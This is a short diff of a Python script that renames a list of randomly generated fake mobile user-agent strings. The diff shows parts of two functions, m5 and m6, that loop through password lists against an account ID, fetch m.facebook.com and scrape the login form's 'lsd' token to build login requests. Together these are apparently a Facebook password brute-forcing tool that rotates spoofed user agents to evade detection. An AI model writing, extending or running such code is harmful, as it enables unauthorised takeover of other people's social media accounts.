@@ -83,7 +83,7 @@ for i in range(10000):
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugeenn.append(uaku2)
+    ugen.append(uaku2)
 #User Agnes buatan Asep Yusup 
     rr = random.randint
     rc = random.choice
@@ -1136,7 +1136,7 @@ def m5(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   pro = random.choice(ugeenn)
+   pro = random.choice(ugen)
    free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
     "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1208,7 +1208,7 @@ def m6(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   pro = random.choice(ugeenn)
+   pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
    log_data = {
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
